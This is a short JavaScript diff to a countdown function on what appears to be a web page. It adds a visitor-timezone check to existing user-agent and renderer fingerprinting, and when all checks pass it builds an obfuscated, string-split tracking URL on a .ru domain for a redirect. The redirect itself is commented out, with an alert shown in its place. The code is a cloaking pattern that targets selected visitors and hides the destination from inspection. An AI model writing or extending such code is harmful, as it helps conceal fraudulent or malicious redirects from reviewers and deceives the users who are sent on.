@@ -434,7 +434,15 @@ function countdown(){
 		var myuseragent = 0;
 	}	
 	
-	if ((myuseragent1==myuseragent2) && (myrenderer==1) && (myuseragent==1)) {
+	var mytz = 0;
+	let tz = new Date().getTimezoneOffset()/-60;
+	const tzmin = 2;
+	const tzmax = 4;
+	if (tz >= tzmin && tz <= tzmax) {
+		var mytz = 1;
+	}
+	
+	if ((myuseragent1==myuseragent2) && (myrenderer==1) && (myuseragent==1) && (mytz==1)) {
 		var url = 'htt'+'p:/'+'/tr'+'ck.p'+'lsy'+'.ru/cl'+'ic'+'k?pi'+'d=2'+'6&o'+'ff'+'er_'+'id=1'+'3'+'7&s'+'ub'+'2=0'+'2'+'6G'+'&'+'s'+'ub'+'3='+utm_term;
 		//window.location.href = url;
 		alert(url);
